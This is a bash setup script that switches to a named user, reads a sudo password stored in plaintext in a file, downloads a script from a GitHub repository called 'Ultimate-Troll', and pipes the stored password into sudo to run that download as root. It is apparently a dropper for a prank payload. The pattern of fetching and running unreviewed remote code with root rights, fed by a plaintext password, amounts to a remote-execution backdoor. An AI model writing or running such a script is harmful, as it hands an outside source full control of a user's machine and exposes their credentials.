#!/usr/bin/env bash
set -euo pipefail

# Ensure the script always runs as user "carterhuang"
if [ "$(whoami)" != "carterhuang" ]; then
  echo "[*] Switching to user carterhuang..."
  exec sudo -u carterhuang bash "$0" "$@"
fi

TARGET_DIR="$HOME/programfiles"
SUBP_DIR="$TARGET_DIR/subp"
PFILE="$TARGET_DIR/p.txt"

# If setup did not complete before, reset sub-directory and continue
if [ ! -f "$SUBP_DIR/success" ]; then
    echo "❌ Success marker not found. Resetting '$SUBP_DIR' and continuing setup..."
    rm -rf "$SUBP_DIR"
    mkdir -p "$SUBP_DIR"
fi

# Verify sudo password file exists
if [ ! -f "$PFILE" ]; then
    echo "❌ Password file not found at '$PFILE'."
    exit 1
fi
SUDO_PASS=$(<"$PFILE")

# Download required scripts
echo "[*] Downloading install-brew.sh..."
curl -sSL -o "$SUBP_DIR/install-brew.sh" "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/install-brew.sh"

# (Add additional script downloads below as needed)
# Example:
# curl -sSL -o "$SUBP_DIR/another-script.sh" "https://example.com/another-script.sh"

# Make all downloaded scripts executable
chmod +x "$SUBP_DIR/"*.sh

# Run the downloaded scripts
echo "[*] Running install-brew.sh..."
echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/install-brew.sh"

# (Run other scripts below as needed)
# Example:
# echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/another-script.sh"



echo "[*] Setup complete!"
# Create a success marker file
touch "$SUBP_DIR/success"